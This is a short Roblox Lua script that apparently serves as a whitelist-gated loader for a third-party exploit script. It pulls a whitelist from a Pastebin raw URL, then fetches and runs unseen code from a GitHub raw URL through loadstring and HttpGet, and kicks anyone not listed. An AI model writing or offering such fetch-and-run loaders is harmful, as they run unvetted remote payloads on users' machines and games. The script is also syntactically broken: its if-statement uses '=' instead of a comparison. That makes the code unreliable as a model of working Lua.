local Player = game.Players.LocalPlayer

local Whitelisted = loadstring(game:HttpGet("https://pastebin.com/raw/JBhW0UXf"))()

if Player.Name = Whitelisted then
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Merdooon/skibidi-sigma-spec-ter/refs/heads/main/specter')))()
else
   Player:Kick("not whitelisted")
end